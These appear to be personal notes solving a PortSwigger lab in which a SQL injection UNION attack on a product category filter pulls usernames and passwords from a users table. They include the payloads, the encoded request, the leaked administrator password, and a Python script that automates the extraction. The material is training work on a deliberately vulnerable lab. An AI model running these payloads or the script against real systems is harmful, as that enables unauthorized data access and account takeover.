This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

---

- Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:

 `'+UNION+SELECT+NULL,'abc'--`

**Payload:**
```php
Pets' UNION SELECT NULL, username||'~'||password FROM users-- 
```

```php
GET /filter?category=Pets'%20UNION%20SELECT%20NULL%2c%20username%7c%7c'~'%7c%7cpassword%20FROM%20users--
```

![[Pasted image 20240831090455.png]]

```php
<tr>
<th>administrator~8i70b58im1huc85x5rm5</th>
<tr>
```

`administrator~8i70b58im1huc85x5rm5`

This script was a bit of a challenge because i don't really know what i'm doing with `re` or the`BeautifulSoup` python modules yet, but it does work and i eventually managed to pull out just the password without anything else being added.

```php
┌──(kali㉿kali)-[~/Documents/portswigger/sql-injection/lab6]
└─$ ./lab6.py https://0ae000140483973d8041629500e200c1.web-security-academy.net/
(+) Launching attack...
Admin pass is: uys03k3uqgp8217hb9qh

```

**Script:**
```python
#!/usr/bin/python3

import sys
import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def union_atk(s, url):
	exploit_url = url + "filter?category=Pets'%20UNION%20SELECT%20NULL%2c%20username%7c%7c'~'%7c%7cpassword%20FROM%20users--"
	r = s.get(exploit_url, verify=False, proxies=proxies)
	if 'admin' in r.text:
		soup = BeautifulSoup(r.text, 'html.parser')
		el = soup.find_all('th')[3]
		admin_pass = el.get_text(separator='~')
		print('Admin pass is: %s' % admin_pass[14:])
	
	else:
		print('(-) Exploit failed.')
		
		
def main():
	if len(sys.argv) != 2:
		print('(+) Usage: %s www.example.com/' % sys.argv[0])
		sys.exit(-1)
		
	print('(+) Launching attack...')
	
	s = requests.Session()
	url = sys.argv[1]
	union_atk(s, url)

if __name__ == '__main__':
	main()
```

- As with all these scripts, sometimes the categories of items change, so you may need to adjust it as needed.

`category=Pets` > `category=Gifts` etc...

---

**Completed:** _10:11 2024-08-31_

